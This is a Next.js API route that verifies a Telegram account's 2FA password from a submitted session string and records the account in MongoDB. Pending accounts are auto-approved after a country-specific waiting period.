import { NextRequest, NextResponse } from 'next/server'
import { verify2FA } from '@/lib/telegram/auth'
import { getDb } from '@/lib/mongodb/connection'

/**
 * POST /api/telegram/auth/verify-2fa
 * Verify 2FA password
 */
export async function POST(request: NextRequest) {
  try {
    // Parse request body with error handling
    let body
    try {
      body = await request.json()
    } catch (parseError) {
      console.error('[Verify2FA] Failed to parse request body:', parseError)
      return NextResponse.json(
        { success: false, error: 'Invalid request format' },
        { status: 400 }
      )
    }

    const { phoneNumber, sessionString, password, telegramId } = body

    if (!phoneNumber || !sessionString || !password) {
      return NextResponse.json(
        { success: false, error: 'Phone number, session string, and password are required' },
        { status: 400 }
      )
    }

    console.log(`[Verify2FA] Verifying 2FA for: ${phoneNumber}`)

    const result = await verify2FA(phoneNumber, sessionString, password)

    if (result.success) {
      // Create or update account record in database
      if (telegramId) {
        try {
          const db = await getDb()
          
          // Get user from database
          const user = await db.collection('users').findOne({ telegram_id: telegramId })
          
          if (user) {
            // Check if account already exists
            const existingAccount = await db.collection('accounts').findOne({
              user_id: user._id,
              phone_number: phoneNumber
            })

            if (existingAccount) {
              console.log(`[Verify2FA] Account exists, checking auto-approve...`)
              
              // Detect country from phone number
              let autoApproveHours = 24 // Default
              
              // Extract country code from phone number (e.g., +1234567890 -> try 1, 12, 123, 1234)
              const phoneDigits = phoneNumber.replace(/[^\d]/g, '')
              let countryFound = false
              
              for (let i = 1; i <= Math.min(4, phoneDigits.length) && !countryFound; i++) {
                const possibleCode = phoneDigits.substring(0, i)
                const country = await db.collection('country_capacity').findOne({ 
                  country_code: possibleCode 
                })
                
                if (country) {
                  autoApproveHours = country.auto_approve_hours ?? 24
                  console.log(`[Verify2FA] Country found: ${country.country_name}, auto-approve: ${autoApproveHours}h`)
                  countryFound = true
                }
              }
              
              if (!countryFound) {
                // Fallback to global setting
                const settings = await db.collection('settings').findOne({ setting_key: 'auto_approve_hours' })
                autoApproveHours = parseInt(settings?.setting_value || '24')
                console.log(`[Verify2FA] No country match, using global setting: ${autoApproveHours}h`)
              }
              
              // Calculate time difference
              const now = new Date()
              const createdAt = existingAccount.created_at
              const hoursPassed = (now.getTime() - createdAt.getTime()) / (1000 * 60 * 60)
              
              console.log(`[Verify2FA] Hours since creation: ${hoursPassed.toFixed(2)}, Auto-approve after: ${autoApproveHours}`)
              
              // Auto-approve if time has passed and status is still pending
              if (hoursPassed >= autoApproveHours && existingAccount.status === 'pending') {
                await db.collection('accounts').updateOne(
                  { _id: existingAccount._id },
                  { 
                    $set: { 
                      status: 'accepted',
                      approved_at: new Date(),
                      auto_approved: true
                    }
                  }
                )
                console.log(`[Verify2FA] ✅ Account auto-approved after ${hoursPassed.toFixed(2)} hours`)
              }
            } else {
              // Insert new account record with pending status
              await db.collection('accounts').insertOne({
                user_id: user._id,
                phone_number: phoneNumber,
                amount: 0, // Default amount, can be updated later
                status: 'pending',
                created_at: new Date()
              })
              
              console.log(`[Verify2FA] Account record created for ${phoneNumber}`)
            }
          }
        } catch (dbError) {
          console.error('[Verify2FA] Database error:', dbError)
        }
      }
      
      return NextResponse.json({
        success: true,
        userId: result.userId,
        message: 'Login successful! Session created.',
      })
    } else {
      return NextResponse.json(
        { success: false, error: result.error },
        { status: 400 }
      )
    }
  } catch (error: any) {
    console.error('[Verify2FA] Error:', error)
    return NextResponse.json(
      { success: false, error: error.message || 'Internal server error' },
      { status: 500 }
    )
  }
}
